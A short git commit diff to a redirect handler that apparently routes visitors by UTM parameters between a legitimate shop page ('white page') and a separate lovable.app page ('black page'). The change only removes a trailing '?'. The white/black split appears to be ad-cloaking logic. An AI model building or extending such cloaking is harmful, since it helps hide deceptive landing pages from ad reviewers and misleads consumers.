8a14c34cecd8051948791aefa901350f22c509e8
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-11-07 03:49:17 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.gdaybaby.com.au/collections/shop-baby/products/baby-nursery-gift-set";
-    const blackPageURL = "https://luvcshap.lovable.app/?";
+    const blackPageURL = "https://luvcshap.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
